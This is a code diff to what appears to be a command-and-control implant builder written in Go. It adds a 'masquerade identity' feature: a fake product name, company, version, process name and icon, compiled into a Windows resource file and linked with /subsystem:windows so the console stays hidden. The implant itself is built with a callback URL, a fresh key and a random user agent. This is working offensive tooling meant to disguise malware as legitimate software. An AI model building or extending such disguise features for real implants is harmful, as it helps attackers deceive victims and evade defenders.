@@ -17,6 +17,13 @@ type BuildRequest struct {
 	Path    string
 	IdleSec int
 	FastSec int
+
+	// Optional masquerade identity; empty means "no disguise".
+	DisplayName string
+	Company     string
+	Version     string
+	ProcName    string
+	IconB64     string
 }
 
 // Build compiles a C implant with the chosen callback and a fresh key.
@@ -52,6 +59,16 @@ func Build(req BuildRequest) (filename string, data []byte, err error) {
 	if label == "" {
 		label = "c"
 	}
+	var spec *DisguiseSpec
+	if strings.TrimSpace(req.DisplayName) != "" {
+		spec, err = ParseDisguise(req.DisplayName, req.Company, req.Version, req.ProcName)
+		if err != nil {
+			return "", nil, err
+		}
+		if err := SetIcon(spec, req.IconB64); err != nil {
+			return "", nil, err
+		}
+	}
 	entry, err := secrets.Issue(label)
 	if err != nil {
 		return "", nil, err
@@ -59,17 +76,18 @@ func Build(req BuildRequest) (filename string, data []byte, err error) {
 	if mgrStore != nil {
 		mgrStore.SetIntervalPolicy(uint32(idle), uint32(fast))
 	}
+	procName := ""
+	if spec != nil {
+		procName = spec.ProcName
+	}
 	cfgH, err := GenerateConfigH(ConfigParams{
 		URL:             fullURL,
 		SecretB64:       entry.SecretB64,
 		KeyName:         entry.KeyName,
 		UserAgent:       RandomUserAgent(),
 		BaseIntervalSec: uint32(idle),
+		ProcName:        procName,
 	})
-	if err != nil {
-		return "", nil, err
-	}
-	data, err = compileImplant(cfgH, goos, goarch)
 	if err != nil {
 		return "", nil, err
 	}
@@ -81,7 +99,12 @@ func Build(req BuildRequest) (filename string, data []byte, err error) {
 	if goos == "windows" {
 		ext = ".exe"
 	}
-	return fmt.Sprintf("%s-%s-%s%s", sanitizeFile(name), goos, goarch, ext), data, nil
+	finalName := fmt.Sprintf("%s-%s-%s%s", sanitizeFile(name), goos, goarch, ext)
+	data, err = compileImplant(cfgH, goos, goarch, spec, finalName)
+	if err != nil {
+		return "", nil, err
+	}
+	return finalName, data, nil
 }
 
 func supportedTarget(goos, goarch string) error {
@@ -110,7 +133,7 @@ func sanitizeFile(name string) string {
 	return b.String()
 }
 
-func compileImplant(configH, goos, goarch string) ([]byte, error) {
+func compileImplant(configH, goos, goarch string, disguise *DisguiseSpec, originalFilename string) ([]byte, error) {
 	src, err := findSources()
 	if err != nil {
 		return nil, err
@@ -150,6 +173,20 @@ func compileImplant(configH, goos, goarch string) ([]byte, error) {
 		// Headers and shared libraries come from a cached Debian sysroot.
 		// Zig's own search path is empty when the target is not the host.
 		args = append(args, "-I"+include, "-L"+lib)
+	}
+	if goos == "windows" && disguise != nil {
+		if err := os.WriteFile(filepath.Join(dir, "icon.ico"), disguise.Icon, 0o644); err != nil {
+			return nil, err
+		}
+		if err := os.WriteFile(filepath.Join(dir, "disguise.rc"), generateRC(disguise, true, originalFilename), 0o644); err != nil {
+			return nil, err
+		}
+		rcCmd := exec.Command(zig, "rc", "--", "disguise.rc", "disguise.res")
+		rcCmd.Dir = dir
+		if rcOut, rcErr := rcCmd.CombinedOutput(); rcErr != nil {
+			return nil, fmt.Errorf("编译失败: %v\n%s", rcErr, rcOut)
+		}
+		args = append(args, "disguise.res", "-Xlinker", "/subsystem:windows")
 	}
 	args = append(args, "-o", outPath, "main.c", spec.src)
 	args = append(args, spec.extra...)
